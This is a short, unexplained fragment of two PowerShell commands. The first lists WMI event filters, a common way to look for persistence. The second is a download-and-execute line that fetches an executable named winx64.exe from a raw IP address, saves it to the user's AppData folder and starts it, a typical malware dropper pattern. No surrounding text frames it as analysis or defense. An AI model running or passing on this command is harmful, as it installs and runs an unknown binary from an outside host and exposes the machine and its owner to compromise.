
ForEach ($NameSpace in "root\subscription","root\default") { Get-WmiObject -Namespace $NameSpace -Query "select * from __EventFilter" }

(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")

